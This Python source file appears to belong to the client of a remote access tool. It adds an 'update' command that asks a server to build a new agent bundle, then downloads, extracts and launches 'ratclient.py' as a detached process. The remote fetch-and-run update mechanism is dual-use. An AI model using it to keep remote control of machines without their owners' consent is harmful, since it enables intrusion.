import os
import shutil
from pathlib import Path
from urllib.parse import quote

import requests

from client.commands.interrupts import interruptible
from client.config.config import (
    SERVER_HOST,
    SERVER_PORT,
    SERVER_WEB_HOST,
    SERVER_WEB_PORT,
    SERVER_WEB_SCHEME,
    UPLOAD_BASE_URL,
)
from core.utils.client_util import (
    build_bundle_extract_dir,
    get_client_bundle_release_dir,
    safe_extract_zip_file,
    spawn_detached_python_script, ensure_directory, detect_platform_name,
)
from core.utils.decorator import desc


class CommandUpdateMixin:
    BUILD_API_TIMEOUT = (15, 600)
    DOWNLOAD_TIMEOUT = (15, 600)
    DOWNLOAD_CHUNK_SIZE = 64 * 1024

    def _build_update_request_payload(self) -> dict:
        # update 固定走 bundle 构建，不再依赖前台选择
        return {
            'server_host': SERVER_HOST,
            'server_port': SERVER_PORT,
            'server_web_scheme': SERVER_WEB_SCHEME,
            'server_web_host': SERVER_WEB_HOST,
            'web_port': SERVER_WEB_PORT,
            'target_os': 'bundle',
            'builder': 'bundle',
            'target_arch': '',
            'source': 'update',
        }

    def _request_update_bundle(self) -> dict:
        response = requests.post(
            f'{UPLOAD_BASE_URL}/api/agent/build',
            json=self._build_update_request_payload(),
            timeout=self.BUILD_API_TIMEOUT,
        )

        try:
            payload = response.json()
        except Exception:
            payload = {}

        if response.status_code >= 400:
            raise RuntimeError(payload.get('message') or f'Build bundle failed: HTTP {response.status_code}')

        if payload.get('code') != 0:
            raise RuntimeError(payload.get('message') or 'Build bundle failed')

        data = payload.get('data') or {}
        file_name = str(data.get('file_name') or '').strip()
        if not file_name:
            raise RuntimeError('Build bundle response missing file_name')

        download_url = str(data.get('download_url') or '').strip()
        if not download_url:
            download_url = f'{UPLOAD_BASE_URL}/api/agent/download/{quote(file_name)}'
        elif download_url.startswith('/'):
            download_url = f'{UPLOAD_BASE_URL}{download_url}'

        data['file_name'] = file_name
        data['download_url'] = download_url
        return data

    def _download_bundle_archive(self, download_url: str, archive_path: str):
        temp_path = archive_path + '.part'
        os.makedirs(os.path.dirname(archive_path), exist_ok=True)

        try:
            with requests.get(download_url, stream=True, timeout=self.DOWNLOAD_TIMEOUT) as response:
                response.raise_for_status()
                with open(temp_path, 'wb') as file_obj:
                    for chunk in response.iter_content(chunk_size=self.DOWNLOAD_CHUNK_SIZE):
                        self._ensure_not_interrupted()
                        if not chunk:
                            continue
                        file_obj.write(chunk)
            os.replace(temp_path, archive_path)
        except Exception:
            try:
                if os.path.exists(temp_path):
                    os.remove(temp_path)
            except Exception:
                pass
            raise

    @desc('Build, download, extract and launch the latest client bundle', group='session')
    @interruptible()
    def update(self, arg=''):
        try:
            bundle_meta = self._request_update_bundle()
            release_dir = get_client_bundle_release_dir()
            archive_path = os.path.join(release_dir, bundle_meta['file_name'])
            extract_dir = build_bundle_extract_dir(release_dir, bundle_meta['file_name'])

            self._download_bundle_archive(bundle_meta['download_url'], archive_path)

            if os.path.isdir(extract_dir):
                shutil.rmtree(extract_dir)

            safe_extract_zip_file(archive_path, extract_dir)

            ratclient_path = os.path.join(extract_dir, 'ratclient.py')
            if not os.path.isfile(ratclient_path):
                raise FileNotFoundError(f'ratclient.py not found after extract: {ratclient_path}')

            pid_str = ''
            if detect_platform_name().lower() != 'ios':
                process = spawn_detached_python_script(ratclient_path, cwd=extract_dir)
                pid_str = f'PID: {process.pid}'

            return 1, (
                f'Update bundle downloaded and started\n'
                f'Build Version: {bundle_meta.get("build_version") or "-"}\n'
                f'Downloaded Archive: {archive_path}\n'
                f'Extracted Path: {extract_dir}\n'
                f'Launch Script: {ratclient_path}\n'
                + pid_str

            )
        except Exception as e:
            return 0, f'Failed to update client bundle: {e}'